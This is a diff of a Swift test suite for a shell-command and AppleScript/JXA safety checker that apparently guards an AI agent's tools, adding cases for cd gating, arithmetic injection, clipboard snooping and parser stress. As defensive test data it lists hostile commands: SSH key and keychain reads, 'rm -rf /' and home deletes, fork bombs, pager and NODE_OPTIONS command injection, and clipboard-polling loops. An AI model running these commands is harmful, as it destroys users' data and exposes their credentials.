@@ -419,7 +419,9 @@ private let safetyCases: [SafetyCase] = [
     .init("(( $(curl -s http://x.example/n) ))", .blocked),
     .init("d=$(curl -s http://x.example/n); (( d ))", .blocked),
     .init("(( $(date +%s) % 2 ))", .high),
-    .init("x=$(date +%s); (( y = x + 1 ))", .high),
+    // `date +%s` only prints digits, which can't name a subscript (safety-usability#3).
+    .init("x=$(date +%s); (( y = x + 1 ))", .low),
+    .init("x=$(cat n.txt); (( y = x + 1 ))", .high),
     .init("read n < /tmp/n; (( n * 2 ))", .high),
     .init("n=5; (( n * 2 ))", .low),
     .init("(( i++ ))", .low),
@@ -456,8 +458,11 @@ private let safetyCases: [SafetyCase] = [
     .init("cat ${HOME:h}/.ssh/id_rsa", .high),
     .init("cat $HOME:h/.ssh/id_rsa", .high),
     .init("cat $HOME[1,-1]/.ssh/id_rsa", .high),
-    // A `cd` that might not take effect: a relative key path is judged against the old folder too.
-    .init("cd /nonexistent && cat .ssh/id_rsa", .high),
+    // A `cd` that might not take effect: a relative key path is judged against the old folder too,
+    // unless `&&` stops the rest when it fails (safety-usability#1/#4).
+    .init("cd /nonexistent && cat .ssh/id_rsa", .low),
+    .init("cd /nonexistent; cat .ssh/id_rsa", .high),
+    .init("cd /nonexistent || cat .ssh/id_rsa", .high),
     .init("cd /tmp && cat notes.txt", .low),
     // An uninstaller-shaped delete under ~/Library needs approval, not a block.
     .init("rm -rf ~/Library/*/com.vendor.app", .high),
@@ -466,6 +471,157 @@ private let safetyCases: [SafetyCase] = [
     // Clipboard reads after a delay or in a loop can catch a password copied mid-run.
     .init("sleep 5; pbpaste", .high),
     .init("while true; do pbpaste; sleep 1; done", .high),
+    .init("while true; do pbpaste; done", .high),
+    .init("watch pbpaste", .high),
+    .init("find . -exec pbpaste \\;", .high),
+    .init("while true; do osascript -e 'the clipboard'; done", .high),
+
+    // Third pass. The table runs from the home folder (`cwd: nil`), the default without a
+    // workspace. A `cd` joined by `&&` to what follows gates it: if the cd fails nothing after
+    // it runs, so the old folder isn't a place those commands can run (safety-usability#1/#4).
+    .init("cd ~/proj/build && rm -rf *", .high),
+    .init("cd ~/proj/build && rm -rf ./*", .high),
+    .init("cd /tmp/scratch && rm -rf *", .high),
+    .init("cd ~/proj/build && find . -delete", .high),
+    .init("cd ~/proj && rm -rf **/node_modules", .high),
+    .init("cd ~/proj && rm -rf **/*.pyc", .high),
+    .init("cd ~/proj && chmod -R u+w *", .high),
+    .init("cd ~/proj && rm -rf Library", .high),
+    .init("cd ~/proj && rm -rf .", .high),
+    .init("cd ~/proj && make && cd build && rm -rf *", .high),
+    .init("cd ~/proj; cd build && rm -rf *", .high),
+    .init("builtin cd ~/proj && rm -rf *", .high),
+    .init("pushd ~/proj && rm -rf *", .high),
+    .init("cd ~/proj && (rm -rf *)", .high),
+    .init("cd ~/proj/build || exit 1; rm -rf *", .high),
+    .init("cd ~/proj && cp README.md ../README.bak", .medium),
+    .init("cd ~/proj && git diff > ../changes.patch", .medium),
+    .init("cd ~/proj && mkdir -p ../proj-backup", .medium),
+    .init("cd ~/proj/sub && touch ../x.txt", .medium),
+    .init("cd ~/proj/sub && mv a.txt ../b.txt", .medium),
+    .init("cd ~/proj/old && mv * ../new/", .medium),
+    .init("cd ~/proj && wc -l **/*.swift", .low),
+    // …but where the old folder is still possible, the block stays.
+    .init("cd ~/proj/build; rm -rf *", .blocked),
+    .init("cd /missing || rm -rf *", .blocked),
+    .init("cd ~/proj && make; rm -rf *", .blocked),
+    .init("a || cd /tmp && rm -rf *", .blocked),
+    .init("! cd /tmp && rm -rf *", .blocked),
+    .init("cd /tmp | cat && rm -rf *", .blocked),
+    .init("cd /tmp & rm -rf *", .blocked),
+    .init("cd \"$(mktemp -d)\" && touch a && rm -rf *", .blocked),
+    .init("cd ~/proj/* && rm -rf *", .blocked),
+    .init("cd a b && rm -rf *", .blocked),
+    .init("cd /tmp/x; cd ..; rm -rf *", .blocked),
+    .init("echo $(cd /tmp && true); rm -rf *", .blocked),
+    .init("(cd /tmp && true); rm -rf *", .blocked),
+    .init("sh -c 'cd /tmp &&' && rm -rf *", .blocked),
+    .init("bash -c 'cd /tmp && true' && rm -rf *", .blocked),
+    .init("env cd /tmp && rm -rf *", .blocked),
+    .init("cd() { :; }; cd /tmp && rm -rf *", .blocked),
+    .init("alias cd=true\ncd /tmp && rm -rf *", .blocked),
+    .init("cd ~/proj/build || exit & rm -rf *", .blocked),
+    .init("if false; then cd /tmp || exit; fi; rm -rf *", .blocked),
+    .init("f() { cd /tmp || return; }; rm -rf *", .blocked),
+    .init("trap 'cd /tmp || exit' EXIT; rm -rf *", .blocked),
+    .init("eval 'cd /tmp || exit'; rm -rf *", .blocked),
+    .init("cd ~/proj; cp a ../b", .high),
+
+    // `[`/`test` compare `-eq` operands as integers in zsh and bash, never evaluating them, so
+    // only `[[ ]]`, `(( ))`, `$(( ))`, `let` and integer declarations count (safety-usability#2/#3).
+    .init("code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com); [ \"$code\" -eq 200 ]", .low),
+    .init("code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com); [ \"$code\" -eq 200 ] && echo up || echo down", .low),
+    .init("code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com); test \"$code\" -eq 200", .low),
+    .init("code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com); [[ $code -eq 200 ]]", .low),
+    .init("code=$(curl -s -o /dev/null -w '%{http_code}\\n' https://example.com); (( code == 200 ))", .low),
+    .init("code=$(curl -s https://example.com); [[ $code -eq 200 ]]", .blocked),
+    .init("code=$(curl -s -o /dev/null -w 'code %{http_code}' https://example.com); (( code ))", .blocked),
+    .init("code=$(curl -s -o out.html -w '%{http_code}' https://a.example https://b.example); (( code ))", .blocked),
+    .init("x='a[$(touch y)]'; [ \"$x\" -eq 1 ]", .low),
+    .init("ksh -c 'x=\"a[\\$(touch y)]\"; [ \"$x\" -eq 1 ]'", .high),
+    .init("[ -v 'a[$(touch y)]' ]", .high),
+    .init("n=$(wc -l < f); [ \"$n\" -gt 10 ]", .low),
+    .init("test \"$n\" -gt 10", .low),
+    .init("start=$(date +%s); sleep 1; end=$(date +%s); echo \"took $((end - start))s\"", .low),
+    .init("count=$(git status --porcelain | wc -l); if [ \"$count\" -gt 0 ]; then echo dirty; fi", .low),
+    .init("n=$(ls | wc -l); echo $((n + 1))", .low),
+    .init("total=0; for f in Sources/*.swift; do n=$(wc -l < \"$f\"); total=$((total + n)); done", .low),
+    .init("wc -l Sources/*.swift | sort -n | while read -r n f; do [ \"$n\" -gt 500 ] && echo \"$f\"; done", .low),
+    .init("while IFS= read -r line; do [[ ${#line} -gt 120 ]] && echo \"$line\"; done < file.swift", .low),
+    .init("ver=$(sw_vers -productVersion); [ \"${ver%%.*}\" -ge 14 ]", .low),
+    .init("echo \"$(date): $((1 + 1))\"", .low),
+    .init("n=$(wc -l < f | tr -d ' '); (( n > 1 ))", .low),
+    .init("x=$(git rev-list --count HEAD); (( x > 0 ))", .low),
+    .init("x=$(stat -f %z f); (( x > 10 ))", .low),
+    .init("integer n=$(wc -l < f); echo $n", .low),
+    // Arithmetic that really re-evaluates text stays high (or blocked for downloads).
+    .init("while read -r n; do echo $((n * 2)); done < nums.txt", .high),
+    .init("x=$(cat f); echo $((x))", .high),
+    .init("read n < f; (( n ))", .high),
+    .init("v=$(cat f); [[ ${v%%.*} -ge 14 ]]", .high),
+    .init("x=$(wc -l f); (( x ))", .high),
+    .init("x=$(stat -f %N f); (( x > 1 ))", .high),
+    .init("x=$(date +%A); (( x ))", .high),
+    .init("n=$(wc -l < f 2>&1); (( n > 1 ))", .high),
+    .init("local x=$(cat f); (( x ))", .high),
+    .init("let \"x=$(curl -s http://x.example/n)\"", .blocked),
+    .init("typeset -i x=$(curl -s http://x.example/n)", .blocked),
+    .init("echo $(( $(curl -s http://x.example/n) + 1 ))", .blocked),
+
+    // Clipboard loops are read from the parsed commands, not loop words in the text, and a
+    // `swift test` filter that names the clipboard runs no script (safety-usability#6).
+    .init("pbpaste > notes.txt && echo \"saved for later\"", .medium),
+    .init("pbpaste | grep -c for", .low),
+    .init("pbpaste | awk '{for(i=1;i<=NF;i++) print $i}'", .low),
+    .init("pbpaste | head -c 200; echo; echo \"done for now\"", .low),
+    .init("pbpaste | while read -r l; do echo \"$l\"; done", .low),
+    .init("for t in ClipboardTests ShellTests; do swift test --filter $t; done", .medium),
+
+    // `export NAME` uses the value the line gave it (safety-usability#7).
+    .init("PAGER=cat; export PAGER; git log -3", .low),
+    .init("GIT_PAGER=cat; export GIT_PAGER; git log -3", .low),
+    .init("PAGER='touch x'; export PAGER; git log -3", .high),
+    .init("for GIT_SSH_COMMAND in x; do export GIT_SSH_COMMAND; done", .high),
+
+    // Common developer settings (safety-usability#12), and the values that stay high.
+    .init("PYTHONPATH=. python3 -m pytest", .medium),
+    .init("PYTHONPATH=src python3 -m pytest tests/", .medium),
+    .init("PYTHONPATH=src:lib pytest", .medium),
+    .init("NODE_OPTIONS=--max-old-space-size=4096 npm run build", .medium),
+    .init("git -c core.pager=cat log --oneline -5", .low),
+    .init("git -c pager.log=false log", .low),
+    .init("export PATH=\"/opt/homebrew/bin:/opt/homebrew/sbin${PATH+:$PATH}\"", .low),
+    .init("PYTHONPATH=/tmp/evil python3 x.py", .high),
+    .init("PYTHONPATH=~/Downloads python3 x.py", .high),
+    .init("PYTHONPATH=../other python3 x.py", .high),
+    .init("NODE_OPTIONS='--require ./x.js' npm test", .high),
+    .init("NODE_OPTIONS='--max-old-space-size=4096 --import ./x.mjs' npm test", .high),
+    .init("git -c core.pager='touch x' log", .high),
+    .init("git -c pager.log='touch x' log", .high),
+    .init("export PATH=\"/tmp/x${PATH+:$PATH}\"", .high),
+
+    // Listing programs print names and sizes, never contents (safety-usability#13); `**/`
+    // skips hidden folders unless dots are on, as zsh does.
+    .init("du -sh ~/Library/* | sort -h", .low),
+    .init("du -sh ~/Library/Application\\ Support/* | sort -h", .low),
+    .init("ls ~/Library/Application\\ Support/*", .low),
+    .init("ls ~/Library/**/*.plist", .low),
+    .init("ls **/*.swift", .low),
+    .init("wc -l **/*.swift", .low),
+    .init("cat ~/Library/*/login.keychain-db", .high),
+    .init("ls ~/.ssh", .high),
+    .init("cat ~/**/id_ed25519", .high),
+    .init("cat ~/*/id_rsa(D)", .high),
+    .init("cat ~/**/.ssh/id_rsa", .high),
+    .init("o=globdots; setopt $o; cat ~/*/id_rsa", .high),
+
+    // Wrappers are unwrapped however many there are (a fixed limit hid what they run).
+    .init("nohup nohup nohup nohup nohup nohup nohup nohup nohup nohup nohup nohup nohup rm -rf /", .blocked),
+    .init("env env env env env env env env env env env env env env rm -rf ~", .blocked),
+    // Fork bombs are found in the parsed commands; one quoted as text is only text.
+    .init("function b { b | b & }; b", .blocked),
+    .init("echo ':(){ :|:& };:' | sh", .blocked),
+    .init("echo ':(){ :|:& };:'", .low),
 ]
 
 @Suite("CommandSafety")
@@ -526,6 +682,31 @@ struct CommandToolsSafetyTests {
         #expect(CommandSafety.assess("echo 'unterminated", cwd: nil, home: testHome).risk == .low)
     }
 
+    /// With no workspace the agent runs from home; `cd <project> && …` there is approval-gated
+    /// like anywhere else, not blocked (safety-usability#1), and `../` writes stay in home (#4).
+    @Test func cdChainsFromTheDefaultFolder() {
+        let ctx = ToolContext(settings: AppSettings(), gate: ExecutionGate(), workingDirectory: URL(fileURLWithPath: NSHomeDirectory()))
+        let rm = ShellRunTool().assess(["command": "cd ~/Projects/app/build && rm -rf *"], context: ctx)
+        #expect(rm.blocked == nil && rm.risk == .high, "\(rm.blocked ?? "") \(rm.reasons)")
+        let modules = ShellRunTool().assess(["command": "cd ~/Projects/app && rm -rf **/node_modules"], context: ctx)
+        #expect(modules.blocked == nil && modules.risk == .high, "\(modules.blocked ?? "") \(modules.reasons)")
+        let patch = ShellRunTool().assess(["command": "cd ~/Projects/app && git diff > ../changes.patch"], context: ctx)
+        #expect(patch.risk == .medium, "\(patch.reasons)")
+        // Without the gate, home is still possible, so the block stays.
+        #expect(ShellRunTool().assess(["command": "cd ~/Projects/app/build; rm -rf *"], context: ctx).blocked != nil)
+    }
+
+    /// Analysis over budget stops and says so, as high; it never comes out low.
+    @Test func workBeyondTheBudgetIsHighNotLow() {
+        // Thirteen possible folders after the `cd`, so every relative glob is matched thirteen
+        // times against every key folder.
+        let command = "cd /tmp/{a,b,c,d}{e,f,g}; cat " + String(repeating: "x* ", count: 20_000)
+        let analysis = CommandSafety.analyze(command, cwd: nil, home: testHome)
+        #expect(analysis.verdict.risk == .high)
+        #expect(analysis.verdict.reasons.contains("too complex to check"), "\(analysis.verdict.reasons)")
+        #expect(analysis.work > ShellRiskChecker.workLimit)
+    }
+
     @Test func accessLevels() {
         let read = CommandSafety.assess("ls")
         let write = CommandSafety.assess("mkdir ~/x")
@@ -536,8 +717,146 @@ struct CommandToolsSafetyTests {
     }
 }
 
+// MARK: - Inputs built to be slow, deep or huge
+
+/// A command line made to crash or stall the checker, and the least it must be rated.
+struct AdversarialCase: Sendable, CustomTestStringConvertible {
+    let name: String
+    let command: String
+    /// The verdict must be at least this (blocked counts as above high).
+    let atLeast: Expect
+    init(_ name: String, _ command: String, _ atLeast: Expect) { self.name = name; self.command = command; self.atLeast = atLeast }
+    var testDescription: String { "\(name) (\(command.utf8.count) bytes)" }
+}
+
+private func rep(_ s: String, _ n: Int) -> String { String(repeating: s, count: n) }
+
+private let adversarialCases: [AdversarialCase] = [
+    // safety-usability#8: brace expansion used to recurse once per range or nesting level.
+    .init("brace ranges", "ls " + rep("{1..2}", 5000), .low),
+    .init("nested braces", "ls " + rep("{a,", 5000) + "b" + rep("}", 5000), .low),
+    .init("brace product", "cat ~/" + rep("{a,b}", 3000) + "/.ssh/id_rsa", .high),
+    // #9: `**/` matching was exponential in the number of `**/`.
+    .init("many **/", "rm -rf /" + rep("**/", 1000) + "x", .blocked),
+    .init("many **/ under home", "cat ~/" + rep("**/", 5000) + "id_rsa", .high),
+    // #10: one regex per run-time variable and arithmetic expression.
+    .init("run-time variables × arithmetic", (0..<3000).map { "v\($0)=$(true); " }.joined() + rep("echo $((1)); ", 3000), .low),
+    // #11: the fork-bomb regex scanned to the end from every function header.
+    .init("function headers", rep("a(){ b; ", 20_000), .medium),
+    // Parameter expansions with no closing brace (quadratic regexes).
+    .init("unclosed ${a:=", "echo " + rep("${a:=", 30_000), .low),
+    .init("unclosed ${(", "echo " + rep("${(", 30_000), .low),
+    .init("unclosed ${", "echo " + rep("${", 60_000), .low),
+    .init("unclosed subscripts", "echo " + rep("${a[", 30_000), .low),
+    .init("awk prints", "awk '" + rep("print ", 30_000) + "' f", .low),
+    .init("long star run", "cat ~/.ssh/" + rep("*", 100_000), .high),
+    // Folder tracking: each `cd` into braces multiplied the folders.
+    .init("cd into braces", rep("cd {a,b}; ", 40) + "rm -rf *", .high),
+    .init("cd chain", rep("cd a && ", 10_000) + "rm -rf *", .high),
+    .init("cd sequence", rep("cd a; ", 20_000) + "rm -rf *", .high),
+    // Nesting without a parser level used to recurse without bound.
+    .init("find -exec chain", rep("find . -exec ", 5000) + "rm -rf ~ \\;", .high),
+    .init("jobs -x chain", rep("jobs -x ", 5000) + "rm -rf ~", .high),
+    .init("eval chain", "x=1; " + rep("eval ", 5000) + "echo $x", .high),
+    .init("nested substitutions", "echo " + rep("$(", 20_000) + "ls" + rep(")", 20_000), .high),
+    .init("nested subshells", rep("( ", 30_000) + "rm -rf ~" + rep(" )", 30_000), .high),
+    .init("nested quoted eval", "eval " + rep("\"$(", 5000) + "ls" + rep(")\"", 5000), .high),
+    .init("nested arithmetic", "echo " + rep("$((", 20_000) + "1" + rep("))", 20_000), .high),
+    // A fixed unwrap limit used to let the command behind it through as medium.
+    .init("many wrappers", rep("nohup ", 25_000) + "rm -rf /", .blocked),
+    .init("many env", rep("env ", 30_000) + "rm -rf /", .blocked),
+    // Many operands, reasons and commands.
+    .init("many deletes", "rm -rf " + (0..<15_000).map { "~/x\($0)/*" }.joined(separator: " "), .high),
+    .init("many key globs", "cat " + (0..<12_000).map { "~/.ss?/\($0)*" }.joined(separator: " "), .high),
+    .init("many commands", rep("ls; ", 45_000), .low),
+    .init("long pipeline", Array(repeating: "cat", count: 40_000).joined(separator: " | "), .low),
+    .init("embedded shell scripts", "osascript -e '" + rep("do shell script \"", 8000) + "'", .high),
+    .init("glob qualifier code", "ls *(" + rep("e:", 30_000) + ")", .high),
+]
+
+@Suite("CommandSafety limits")
+struct CommandToolsLimitTests {
+    /// Every case finishes well within the limit (debug build), doesn't crash, and isn't rated
+    /// below what it is. Each runs through `assess`, on the checker's own thread.
+    @Test(arguments: adversarialCases)
+    func finishesQuicklyAndFailsClosed(_ c: AdversarialCase) {
+        let clock = ContinuousClock()
+        var verdict = ToolVerdict(risk: .low, summary: "")
+        let elapsed = clock.measure { verdict = CommandSafety.assess(c.command, cwd: nil, home: testHome) }
+        #expect(elapsed < .seconds(5), "\(c.name) took \(elapsed)")
+        switch c.atLeast {
+        case .blocked: #expect(verdict.blocked != nil, "expected blocked; got \(verdict.risk) \(verdict.reasons)")
+        case .high: #expect(verdict.risk == .high, "\(verdict.reasons)")
+        case .medium: #expect(verdict.risk >= .medium, "\(verdict.reasons)")
+        case .low: break
+        }
+        #expect(verdict.reasons.count <= RiskAccumulator.maxReasons)
+    }
+
+    /// The matchers themselves are iterative: run here, on a test's 512 KB thread, inputs that
+    /// used to recurse once per brace, `*` or `**/` come back at once.
+    @Test func pathMatchingNeverRecursesPerCharacter() {
+        let clock = ContinuousClock()
+        let elapsed = clock.measure {
+            // Ranges become `*`; nesting past the limit fails closed (nil).
+            #expect(PathPattern.expandBraces("/" + rep("{1..2}", 5000)) == ["/" + rep("*", 5000)])
+            #expect(PathPattern.expandBraces("/" + rep("{a,", 5000) + "b" + rep("}", 5000)) == nil)
+            #expect(PathPattern.expandBraces("/" + rep("{a,b}", 10)) == nil)
+            #expect(PathPattern.expandBraces("/{a,{b,{c,d}}}/x") == ["/a/x", "/b/x", "/c/x", "/d/x"])
+            #expect(PathPattern.expandBraces("/{x{a,b}}/{1..3}") == ["/{x{a,b}}/*"])
+            let home = PathPattern.literalComponents(testHome)
+            let deep = PathPattern.make(base: home, text: "/" + rep("**/", 5000) + "id_rsa", glob: true, extendedGlob: false)?.first
+            // `**/**/…` collapses to one `**/`, which skips hidden folders unless dots are on.
+            #expect(deep?.components.count == home.count + 2)
+            #expect(deep?.mayReachInside(testHome + "/.ssh", dotGlob: false) == false)
+            #expect(deep?.mayReachInside(testHome + "/.ssh", dotGlob: true) == true)
+            #expect(deep?.mayReachInside(testHome + "/Library/Keychains", dotGlob: false) == true)
+            let stars = Array(repeating: PathPattern.Token.star, count: 100_000) + [PathPattern.Token.char("x")]
+            #expect(PathPattern.matches(stars, "abcx", dotGlob: false))
+            #expect(!PathPattern.matches(Array(repeating: PathPattern.Token.one, count: 100_000), "abc", dotGlob: false))
+        }
+        #expect(elapsed < .seconds(5), "took \(elapsed)")
+    }
+
+    /// The `(D)` qualifier and `GLOB_DOTS` make `*` and `**/` match hidden names.
+    @Test func dotsQualifierAndOptionReachHiddenFolders() {
+        #expect(CommandSafety.assess("cat ~/*/id_rsa(D)", cwd: nil, home: testHome).risk == .high)
+        #expect(CommandSafety.assess("cat ~/*/id_rsa", cwd: nil, home: testHome).risk == .low)
+        #expect(CommandSafety.assess("setopt GLOB_DOTS; cat ~/**/id_rsa", cwd: nil, home: testHome).reasons.contains { $0.contains(".ssh") })
+        #expect(PathPattern.anywhere.mayReachInside(testHome + "/.ssh", dotGlob: false))
+    }
+
+    /// The checker runs on a thread with a large stack, and hands the result back.
+    @Test func runsOnALargeStack() {
+        let size = CommandSafety.onLargeStack { Thread.current.stackSize }
+        #expect((size ?? 0) >= CommandSafety.analysisStackSize)
+    }
+}
+
 @Suite("ScriptSafety")
 struct CommandToolsScriptSafetyTests {
+    /// Which scripts the concealed-clipboard guard has to stop (safety-usability#5): ones that
+    /// name, paste or could reach the clipboard; not `return 1 + 1`.
+    @Test func scriptsThatMayReadTheClipboard() {
+        for s in ["return the clipboard", "set x to clipboard info", "tell application \"System Events\" to keystroke \"v\" using command down",
+                  "do shell script \"pb\" & \"paste\"", "run script (\"the clip\" & \"board\")", "«event JonsgClp»",
+                  "use framework \"AppKit\"\ncurrent application's NSPasteboard's generalPasteboard()",
+                  "tell application \"Terminal\" to do script \"x\"", "tell application \"System Events\" to click menu item \"Paste\" of menu 1"] {
+            #expect(ScriptSafety.mayReadClipboard(s, language: .appleScript), "\(s)")
+        }
+        for s in ["return 1 + 1", "tell application \"Finder\" to get name of every window", "display dialog \"hello\""] {
+            #expect(!ScriptSafety.mayReadClipboard(s, language: .appleScript), "\(s)")
+        }
+        for s in ["Application.currentApplication().theClipboard()", "const n='theClip'+'board'; Application.currentApplication()[n]()",
+                  "app['the' + 'Clipboard']()", "ObjC.import('AppKit')", "$.NSPasteboard.generalPasteboard", "eval('x')",
+                  "Application('System Events').keystroke('v', {using: 'command down'})", "app.doShellScript(cmd)"] {
+            #expect(ScriptSafety.mayReadClipboard(s, language: .javaScript), "\(s)")
+        }
+        for s in ["[1, 2, 3].map(x => x * 2).join(',')", "Application('Finder').windows[0].name()", "Application('Finder')['name']()"] {
+            #expect(!ScriptSafety.mayReadClipboard(s, language: .javaScript), "\(s)")
+        }
+    }
+
     @Test func appleScriptKeywords() {
         #expect(ScriptSafety.assess("return 1 + 1", language: .appleScript).risk == .low)
         #expect(ScriptSafety.assess("tell application \"Finder\" to get name of every window", language: .appleScript).risk == .low)
@@ -1104,11 +1423,14 @@ struct CommandToolsSystemTests {
         await refuses {
             try await OSAScriptTool(language: .javaScript, pasteboardName: name).run(["script": "Application.currentApplication().theClipboard()"], context: ctx)
         }
-        // A JXA script that builds the clipboard name from two pieces is still refused, because
-        // the guard runs for every script, not only when the source mentions the clipboard.
+        // A JXA script that builds the clipboard name from two pieces is still refused: a member
+        // looked up by a computed name could be any property, the clipboard included.
         await refuses {
             try await OSAScriptTool(language: .javaScript, pasteboardName: name).run(["script": "const n='theClip'+'board'; Application.currentApplication()[n]()"], context: ctx)
         }
+        // A script with no way to reach the clipboard runs as usual (safety-usability#5).
+        let sum = try await OSAScriptTool(language: .appleScript, pasteboardName: name).run(["script": "return 1 + 1"], context: ctx)
+        #expect(sum.ok && sum.text == "2")
         #expect(CommandSafety.analyze("pbpaste | wc -c", cwd: nil, home: testHome).readsClipboard)
         #expect(CommandSafety.analyze("python3 -c 'import AppKit; print(AppKit.NSPasteboard.generalPasteboard())'", cwd: nil, home: testHome).readsClipboard)
         #expect(!CommandSafety.analyze("ls -la", cwd: nil, home: testHome).readsClipboard)
@@ -1117,6 +1439,20 @@ struct CommandToolsSystemTests {
         // while a concealed item is on the clipboard.
         let ok = try await ShellRunTool(pasteboardName: name).run(["command": "echo hi"], context: ctx)
         #expect(ok.ok && ok.text.contains("hi"))
+        // So do interpreters and toolchains that run no code of the line's: a version check, a
+        // package build or test run (no more able to reach the clipboard than `make`).
+        let version = try await ShellRunTool(pasteboardName: name).run(["command": "python3 --version"], context: ctx)
+        #expect(!version.text.contains("concealed"))
+        for command in ["swift --version", "swift build --help", "swift test --filter ClipboardTests", "python3 --version", "python3 -m pytest -q",
+                        "node --version", "for t in ClipboardTests ShellTests; do swift test --filter $t; done"] {
+            let a = CommandSafety.analyze(command, cwd: nil, home: testHome)
+            #expect(!a.readsClipboard && !a.runsScript, "\(command)")
+        }
+        for command in ["python3 x.py", "python3 - <<EOF\nprint(1)\nEOF", "cat x.py | python3", "osascript x.scpt", "osascript -e \"$s\"",
+                        "node -e '1'", "swift script.swift"] {
+            #expect(CommandSafety.analyze(command, cwd: nil, home: testHome).runsScript, "\(command)")
+        }
+        #expect(!CommandSafety.analyze("osascript -e 'return 1 + 1'", cwd: nil, home: testHome).runsScript)
     }
 }
 
@@ -1134,6 +1470,13 @@ struct CommandToolsParserTests {
         #expect(first.commands[0].redirects[0].isWrite)
         #expect(!first.commands[0].redirects[1].isWrite)
         #expect(first.commands[1].words.map(\.text) == ["tee", "-a", "log"])
+    }
+
+    /// Each pipeline records what joins it to the next, which decides whether a `cd` gates it.
+    @Test func recordsConnectors() {
+        let p = ShellParser.parse("cd a && make || echo no; ls &\npwd &&\n  date")
+        #expect(p.list.pipelines.map(\.connector) == ["&&", "||", ";", "&", "&&", ""])
+        #expect(ShellParser.parse("f() { :; }").list.pipelines.first?.commands.first?.definesFunction == true)
     }
 
     @Test func removesQuotesAndKeepsNestedCommands() {
